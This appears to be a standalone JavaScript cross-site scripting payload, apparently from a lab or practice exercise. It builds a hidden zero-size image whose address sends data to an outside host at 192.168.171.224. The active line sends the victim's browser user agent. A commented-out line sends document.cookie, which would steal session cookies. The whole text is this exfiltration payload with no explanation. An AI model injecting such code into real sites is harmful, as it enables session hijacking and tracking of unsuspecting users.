var img = document.createElement('img');
img.width = 0;
img.height = 0;
//img.src = 'http://192.168.171.224/joke.php?joke='+encodeURIComponent(document.cookie);
img.src = 'http://192.168.171.224/joke.php?joke='+encodeURIComponent(window.navigator.userAgent);
